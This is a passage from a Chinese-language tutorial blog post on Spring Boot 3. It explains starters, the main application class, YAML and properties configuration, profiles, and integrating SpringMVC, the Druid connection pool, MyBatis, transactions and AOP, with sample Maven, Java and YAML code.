<li><strong>自动配置</strong>：根据类路径中的jar依赖，自动配置Spring应用。</li>
<li><strong>起步依赖</strong>：提供了一系列的“起步依赖”（starter），简化Maven或Gradle依赖管理。</li>
<li><strong>命令行界面（CLI）</strong>：支持使用Groovy快速创建Spring应用。</li>
<li><strong>嵌入式服务器</strong>：内置Tomcat或Jetty服务器，方便开发测试。</li>
<li><strong>生产就绪特性</strong>：包括监控、管理和健康检查等功能。</li>
</ul>
</li>
<li><p><strong>原理</strong>：</p>
<ul>
<li>Spring Boot的核心在于其自动配置机制，它会根据classpath下的jar包和已有的bean定义来决定是否应用某些配置。</li>
<li>使用条件注解（如<code>@ConditionalOnClass</code>, <code>@ConditionalOnMissingBean</code>等）来控制特定配置是否生效。</li>
<li>通过<code>spring.factories</code>文件加载自动配置类，实现非侵入式的配置方式。</li>
</ul>
</li>
</ul>
<p>Spring Boot极大地简化了Spring应用的开发与部署流程，使得开发者可以专注于业务逻辑的实现，而无需过多关注底层架构和技术细节。</p>
<h3 id="入门案例"><a href="#入门案例" class="headerlink" title="入门案例"></a>入门案例</h3><h4 id="1、创建Maven工程"><a href="#1、创建Maven工程" class="headerlink" title="1、创建Maven工程"></a>1、创建Maven工程</h4><p>正常创建Maven工程</p>
<h4 id="2、添加依赖-springboot父工程依赖-web启动器依赖"><a href="#2、添加依赖-springboot父工程依赖-web启动器依赖" class="headerlink" title="2、添加依赖(springboot父工程依赖 , web启动器依赖)"></a>2、添加依赖(springboot父工程依赖 , web启动器依赖)</h4><p>在pom.xml中添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- SpringBoot --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>开发Web工程，需要web启动器：</p>
<p><a href="https://docs.spring.io/spring-boot/reference/using/build-systems.html#using.build-systems.starters">启动器文档</a></p>
<p><strong>Spring Boot启动器（Starter）</strong> 是一组便捷的依赖描述符，旨在简化项目依赖管理，帮助开发者快速搭建和配置Spring应用程序。每个启动器都封装了一系列相关的依赖库，使得开发者无需手动逐个添加和管理这些依赖。</p>
<ol>
<li><p><strong>简化依赖管理</strong>：</p>
<ul>
<li>启动器提供了一种“开箱即用”的方式来引入一系列相关的依赖库。例如，<code>spring-boot-starter-web</code> 自动包含了构建Web应用所需的所有依赖，如Spring MVC、Tomcat嵌入式服务器等。</li>
</ul>
</li>
<li><p><strong>自动配置</strong>：</p>
<ul>
<li>启动器通常与Spring Boot的自动配置机制协同工作。基于类路径中的依赖，Spring Boot会自动配置相应的Bean和设置，减少手动配置的工作量。</li>
</ul>
</li>
<li><p><strong>提高开发效率</strong>：</p>
<ul>
<li>开发者只需在<code>pom.xml</code>或<code>build.gradle</code>中添加相应的启动器依赖，即可快速开始开发特定类型的应用程序，而无需关心底层的依赖管理和配置细节。</li>
</ul>
</li>
<li><p><strong>标准化依赖版本</strong>：</p>
<ul>
<li>启动器确保所有包含的依赖库都是经过测试且兼容的版本，避免了由于依赖版本不匹配导致的问题。</li>
</ul>
</li>
</ol>
<p><strong>常见的启动器示例</strong></p>
<ul>
<li>**<code>spring-boot-starter-web</code>**：用于构建RESTful Web服务，包含Spring MVC、Jackson（JSON处理）、Tomcat（默认嵌入式服务器）等。</li>
<li>**<code>spring-boot-starter-data-jpa</code>**：用于集成Spring Data JPA和Hibernate进行数据库访问。</li>
<li>**<code>spring-boot-starter-security</code>**：用于集成Spring Security进行安全控制。</li>
<li>**<code>spring-boot-starter-thymeleaf</code>**：用于集成Thymeleaf模板引擎，便于构建动态网页。</li>
</ul>
<p>命名规范：<br>官方提供的场景：命名为：spring-boot-starter-*<br>第三方提供场景：命名为：*-spring-boot-starter</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--启动器无需写版本，parent中已经指定--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="3、编写启动引导类-springboot项目运行的入口"><a href="#3、编写启动引导类-springboot项目运行的入口" class="headerlink" title="3、编写启动引导类(springboot项目运行的入口)"></a>3、编写启动引导类(springboot项目运行的入口)</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 主应用程序类，使用<span class="doctag">@SpringBootApplication</span>注解简化Spring Boot应用的配置。</span></span><br><span class="line"><span class="comment"> * 该类包含了应用的入口方法 main(String[])，负责启动Spring Boot应用。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@SpringBootApplication</span> Spring Boot提供的复合注解，组合了<span class="doctag">@Configuration</span>, <span class="doctag">@EnableAutoConfiguration</span>和<span class="doctag">@ComponentScan</span>的功能，默认扫描当前包及其子包下的组件。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">// 自动创建IoC容器，启动Tomcat服务器</span></span><br><span class="line">        SpringApplication.run(Main.class, args); <span class="comment">// 注意：这里需要传入Main.class作为第一个参数以正确识别主类。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>@SpringBootApplication</code> 注解</strong>：是一个复合注解，它实际上包含了三个核心注解：</p>
<ul>
<li><code>@Configuration</code>：将该类标记为配置类，允许在其中定义Bean。</li>
<li><code>@EnableAutoConfiguration</code>：启用Spring Boot的自动配置机制，根据classpath中的依赖自动配置Spring应用。</li>
<li><code>@ComponentScan</code>：启用组件扫描，默认会扫描当前包及其子包下的所有组件（如@Controller, @Service等）。</li>
</ul>
<h4 id="4、编写处理器Controller"><a href="#4、编写处理器Controller" class="headerlink" title="4、编写处理器Controller"></a>4、编写处理器Controller</h4><p>正常编写controller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;boot&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="5、启动项目"><a href="#5、启动项目" class="headerlink" title="5、启动项目"></a>5、启动项目</h4><p>有嵌入式的Tomcat，无需本地Tomcat部署，运行main方法即可。默认部署路径为<code>/</code></p>
<hr>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><a href="https://docs.spring.io/spring-boot/appendix/application-properties/index.html#appendix.application-properties">配置文件书写规范</a></p>
<p>SpringBoot工程下，进行统一的配置管理，你想设置的任何参数（端口号、项目根路径、数据库连接信息等等)都集中到一个<strong>固定位置和命名</strong>的配置文件（<code>application.properties</code>或<code>application.yml</code>）中！<br>配置文件应该放置在Spring Boot工程的<code>src/main/resources</code>目录下。这是因为src&#x2F;main&#x2F;resources目录是Spring Boot默认的类路径（classpath），配置文件会被自动加载并可供应用程序访问。</p>
<p>总结：</p>
<ul>
<li>集中式管理配置。统一在一个文件完成程序功能参数设置和自定义参数声明 。</li>
<li><strong>位置</strong>：resources文件夹下，必须命名application 后缀 .properties &#x2F; .yaml &#x2F; .yml 。</li>
<li>如果同时存在application.properties | application.yml(.yaml) , properties的优先级更高。</li>
<li><strong>配置基本都有默认值</strong>。</li>
<li><code>key</code><strong>值是固定的</strong>，可以访问官方文档查看配置项的功能。</li>
<li><strong>允许自定义配置</strong>，按常规方法。读取时直接使用注解<code>@Value(&quot;$&#123;&#125;&quot;)</code>即可</li>
</ul>
<h3 id="yaml-yml-配置文件书写"><a href="#yaml-yml-配置文件书写" class="headerlink" title="yaml|yml 配置文件书写"></a>yaml|yml 配置文件书写</h3><p>properties文件的配置项采用<code>key-value</code>形式，不同配置的名称可能相同，因此SpringBoot采用了多层命名以区分不同模块相同名称的配置。yaml格式配置文件有层次，可以继承，更清晰，更利于阅读。如：</p>
<p>properties文件：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 端口</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">80</span></span><br><span class="line"><span class="comment"># 上下文</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/springboot</span></span><br><span class="line"><span class="comment"># 自定义</span></span><br><span class="line"><span class="attr">fu.user.name</span> = <span class="string">Shearington</span></span><br></pre></td></tr></table></figure>

<p>yaml文件：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/springboot</span></span><br><span class="line"><span class="attr">fu:</span></span><br><span class="line">	<span class="attr">user:</span></span><br><span class="line">		<span class="attr">name:</span> <span class="string">Shearington</span></span><br><span class="line">		<span class="attr">lover:</span></span><br><span class="line">			<span class="bullet">-</span> <span class="string">Amelia</span></span><br><span class="line">			<span class="bullet">-</span> <span class="string">rem</span></span><br></pre></td></tr></table></figure>

<p>与.properties文件相比，YAML格式有以下优势：</p>
<ol>
<li>层次结构：YAML文件使用缩进和冒号来表示层次结构，使得数据之间的关系更加清晰和直观。这样可以更容易理解和维护复杂的配置，特别适用于深层次嵌套的配置情况。</li>
<li>自我描述性：YAML文件具有自我描述性，字段和值之间使用冒号分隔，并使用缩进表示层级关系。这使得配置文件更易于阅读和理解，并且可以减少冗余的标点符号和引号。</li>
<li>注释支持：YAML格式支持注释，可以在配置文件中添加说明性的注释，使配置更具可读性和可维护性。相比之下，.properties文件不支持注释，无法提供类似的解释和说明。</li>
<li>多行文本：YAML格式支持多行文本的表示，可以更方便地表示长文本或数据块。相比之下，.properties文件需要使用转义符或将长文本拆分为多行。</li>
<li>类型支持：YAML格式天然支持复杂的数据类型，如列表、映射等。这使得在配置文件中表示嵌套结构或数据集合更加容易，而不需要进行额外的解析或转换。</li>
<li>更好的可读性：由于YAML格式的特点，它更容易被人类读懂和解释。它减少了配置文件中需要的特殊字符和语法，让配置更加清晰明了，从而减少了错误和歧义。 综上所述，YAML格式相对于.properties文件具有更好的层次结构表示、自我描述性、注释支持、多行文本表示、复杂数据类型支持和更好的可读性。这些特点使YAML成为一种有力的配置文件格式，尤其适用于复杂的配置需求和人类可读的场景。然而，选择使用YAML还是.properties取决于实际需求和团队的偏好，简单的配置可以使用.properties，而复杂的配置可以选择YAML以获得更多的灵活性和可读性</li>
</ol>
<p><strong>yaml语法说明</strong></p>
<ol>
<li>数据结构用树形结构呈现，通过缩进来表示层级，</li>
<li>连续的项目（集合）通过减号 ” - ” 来表示</li>
<li>键值结构里面的key&#x2F;value对用冒号 ” : ” 来分隔，<code>:</code>和值之间需要空格分隔。</li>
<li>YAML配置文件的扩展名是yaml 或 yml</li>
</ol>
<h3 id="批量配置读取"><a href="#批量配置读取" class="headerlink" title="批量配置读取"></a>批量配置读取</h3><p>读取配置的方式：</p>
<ul>
<li><code>@Value($&#123;key&#125;)</code>注解：添加在属性中，但要求key必须写全，并且只能读取单个值</li>
<li><code>@ConfigurationProperties(prefix=&quot;&quot;)</code>批量配置读取：prefix值为key前缀，所有带此前缀的key值都会被配置到<strong>同名</strong>的属性中。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;fu&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"><span class="comment">//    @Value(&quot;$&#123;fu.name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="多环境配置和激活"><a href="#多环境配置和激活" class="headerlink" title="多环境配置和激活"></a>多环境配置和激活</h3><p>程序开发工程可能经历 开发&#x3D;》测试 &#x3D;》投产三个阶段，每个阶段可能使用不同的环境。SpringBoot提高了切换环境的方法，通过不同的配置文件，可以避免手动切换。</p>
<p><strong>多环境配置文件命名规范：</strong><code>application-&#123;key&#125;.yaml</code></p>
<p><strong>激活方式</strong>：在<code>application.properties/yam/yml</code>中使用<code>spring-profiles-active</code>属性(yaml格式：spring:profiles:active:)即可激活配置文件，多个配置文件可以使用<code>,</code>分隔。当外部配置的key和application.yml的key重复，外部覆盖内部。</p>
<h2 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h2><h3 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h3><p>除以下特别说明外，其他SpringMVC使用方式不变，包括配置类，如果需要也可以按原方式定义。</p>
<h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><p>Springboot中SpringMVC相关的依赖被整合到<code>spring-boot-starter-web</code>，在依赖中导入即可。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- SpringMVC即starter-web --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="相关配置项"><a href="#相关配置项" class="headerlink" title="相关配置项"></a>相关配置项</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SpringMVC相关的web配置 =&gt; 一般在server下</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span>  <span class="comment"># 默认为 8080</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/spring</span>  <span class="comment">#项目根路径</span></span><br><span class="line"><span class="comment"># 静态资源目录配置 ==&gt; 配置后默认静态资源目录无法访问</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">static-locations:</span> <span class="string">classpath:/files</span></span><br></pre></td></tr></table></figure>



<p><strong>默认静态资源路径：</strong>在没有配置的情况下，静态资源必须放置在下述目录之一才能访问。但配置后默认静态资源路径失效。</p>
<blockquote>
<p>classpath:&#x2F;META-INF&#x2F;resources&#x2F;</p>
<p>classpath:&#x2F;resources&#x2F;</p>
<p>classpath:&#x2F;static&#x2F;</p>
<p>classpath:&#x2F;public&#x2F;</p>
</blockquote>
<h3 id="Druid数据源"><a href="#Druid数据源" class="headerlink" title="Druid数据源"></a>Druid数据源</h3><p><strong>注意！</strong>Druid连接池<code>1.2.20以下版本</code>虽然支持SpringBoot3，但缺少自动装配的配置文件，只支持到SpringBoot2。需要特殊配置。<code>1.2.20及以上版本</code>无需手动添加装配文件。</p>
<p><code>1.2.20以下版本</code>需要手动在<code>resources</code>目录下创建目录<code>META-INF/spring/</code>并添加命名如下的文件</p>
<p><code>org.springframework.boot.autoconfigure.AutoConfiguration.imports</code>，文件内容如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">com.alibaba.druid.spring.boot3.autoconfigure.DruidDataSourceAutoConfigure</span><br></pre></td></tr></table></figure>





<h4 id="依赖-1"><a href="#依赖-1" class="headerlink" title="依赖"></a>依赖</h4><p>父工程依赖导入和web开发场景启动器导入同上，以下仅为Druid需要的依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 数据库相关配置启动器 jdbctemplate 事务相关--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- druid启动器依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-3-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 驱动：MySQL的Java连接</span></span><br><span class="line"><span class="comment">8.0.31前叫mysql的mysql-connect-java</span></span><br><span class="line"><span class="comment">8.0.31及以后是com.mysql的mysql-connector-j</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="相关配置项-1"><a href="#相关配置项-1" class="headerlink" title="相关配置项"></a>相关配置项</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="comment"># 连接池类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/test</span></span><br><span class="line">    <span class="attr">username:</span> <span class="number">15767</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">password</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="comment"># Druid的其他属性配置 springboot3整合情况下,数据库连接信息必须在Druid属性下!</span></span><br><span class="line">    <span class="attr">druid:</span></span><br><span class="line"><span class="comment"># 使用durid版本低于1.2.20且搭配springboot3时需要写在druid下</span></span><br><span class="line"><span class="comment">#    url: jdbc:mysql://localhost:3306/day01</span></span><br><span class="line"><span class="comment">#    username: root</span></span><br><span class="line"><span class="comment">#    password: root</span></span><br><span class="line"><span class="comment">#    driver-class-name: com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="comment"># 初始化时建立物理连接的个数</span></span><br><span class="line">      <span class="attr">initial-size:</span> <span class="number">5</span></span><br><span class="line">      <span class="comment"># 连接池的最小空闲数量</span></span><br><span class="line">      <span class="attr">min-idle:</span> <span class="number">5</span></span><br><span class="line">      <span class="comment"># 连接池最大连接数量</span></span><br><span class="line">      <span class="attr">max-active:</span> <span class="number">20</span></span><br><span class="line">      <span class="comment"># 获取连接时最大等待时间，单位毫秒</span></span><br><span class="line">      <span class="attr">max-wait:</span> <span class="number">60000</span></span><br><span class="line">        <span class="comment"># 申请连接的时候检测，如果空闲时间大于timeBetweenEvictionRunsMillis</span></span><br><span class="line">        <span class="comment"># ，执行validationQuery检测连接是否有效。</span></span><br><span class="line">      <span class="attr">test-while-idle:</span> <span class="literal">true</span></span><br><span class="line">      <span class="comment"># 既作为检测的间隔时间又作为testWhileIdel执行的依据</span></span><br><span class="line">      <span class="attr">time-between-eviction-runs-millis:</span> <span class="number">60000</span></span><br><span class="line">      <span class="comment"># 销毁线程时检测当前连接的最后活动时间和当前时间差大于该值时，</span></span><br><span class="line">      <span class="comment"># 关闭当前连接(配置连接在池中的最小生存时间)</span></span><br><span class="line">      <span class="attr">min-evictable-idle-time-millis:</span> <span class="number">30000</span></span><br><span class="line">      <span class="comment"># 用来检测数据库连接是否有效的sql 必须是一个查询语句</span></span><br><span class="line">      <span class="comment"># (oracle中为 select 1 from dual)</span></span><br><span class="line">      <span class="attr">validation-query:</span> <span class="string">select</span> <span class="number">1</span></span><br><span class="line">      <span class="comment"># 申请连接时会执行validationQuery检测连接是否有效,开启会降低性能,默认为true</span></span><br><span class="line">      <span class="attr">test-on-borrow:</span> <span class="literal">false</span></span><br><span class="line">      <span class="comment"># 归还连接时会执行validationQuery检测连接是否有效,开启会降低性能,默认为true</span></span><br><span class="line">      <span class="attr">test-on-return:</span> <span class="literal">false</span></span><br><span class="line">      <span class="comment"># 是否缓存preparedStatement, 也就是PSCache,</span></span><br><span class="line">      <span class="comment"># PSCache对支持游标的数据库性能提升巨大，比如说oracle,在mysql下建议关闭。</span></span><br><span class="line">      <span class="attr">pool-prepared-statements:</span> <span class="literal">false</span></span><br><span class="line">      <span class="comment"># 要启用PSCache，必须配置大于0，当大于0时，poolPreparedStatements自动触发修改为true。在Druid中，</span></span><br><span class="line">      <span class="comment"># 不会存在Oracle下PSCache占用内存过多的问题，可以把这个数值配置大一些，比如说100</span></span><br><span class="line">      <span class="attr">max-pool-prepared-statement-per-connection-size:</span> <span class="number">-1</span></span><br><span class="line">      <span class="comment"># 合并多个DruidDataSource的监控数据</span></span><br><span class="line">      <span class="attr">use-global-data-source-stat:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>





<h3 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h3><h4 id="依赖-2"><a href="#依赖-2" class="headerlink" title="依赖"></a>依赖</h4><p>在上述Druid所需所有依赖的基础上（jdbc不用，但为了声明式事务，其实也会）添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="相关配置项-2"><a href="#相关配置项-2" class="headerlink" title="相关配置项"></a>相关配置项</h4><p><strong>必须指定mapper-locations</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mybatis配置项基本在mybatis下</span></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:/mappers/*.xml</span>   <span class="comment">#指定各mapper.xml文件位置</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.fu.pojo</span> <span class="comment"># 自动为指定包下的类创建类型别名，简化了映射文件中的类引用</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">true</span>  <span class="comment"># 驼峰自映射</span></span><br><span class="line">    <span class="attr">auto-mapping-behavior:</span> <span class="string">full</span> <span class="comment"># 设置了 MyBatis 的自动映射行为为 full</span></span><br><span class="line">    <span class="comment"># 自动为指定包下的类创建类型别名，简化了映射文件中的类引用</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.slf4j.Slf4jImpl</span></span><br></pre></td></tr></table></figure>



<h4 id="主程序类（启动引导类-SpringBootApplication）"><a href="#主程序类（启动引导类-SpringBootApplication）" class="headerlink" title="主程序类（启动引导类@SpringBootApplication）"></a>主程序类（启动引导类@SpringBootApplication）</h4><p>添加注解<code>@MapperScan(&quot;path&quot;)</code>指定 MyBatis 的 Mapper 接口所在的包路径。Spring Boot 会扫描该包及其子包下的所有接口，并将它们注册为 Spring 容器中的 Bean。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@MapperScan(&quot;com.fu.mapper&quot;)</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Main.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="AOP和TX-声明式事务"><a href="#AOP和TX-声明式事务" class="headerlink" title="AOP和TX(声明式事务)"></a>AOP和TX(声明式事务)</h3><h4 id="TX依赖"><a href="#TX依赖" class="headerlink" title="TX依赖"></a>TX依赖</h4><p>即JDBC：可能连接池或Mybatis环节已经导入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 数据库相关配置启动器 jdbctemplate 事务相关--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="TX使用"><a href="#TX使用" class="headerlink" title="TX使用"></a>TX使用</h4><p>使用<code>@Transactional</code>注解即可！其他操作均省略</p>
<h4 id="AOP依赖"><a href="#AOP依赖" class="headerlink" title="AOP依赖"></a>AOP依赖</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="AOP使用"><a href="#AOP使用" class="headerlink" title="AOP使用"></a>AOP使用</h4><p>直接使用aop注解即可</p>
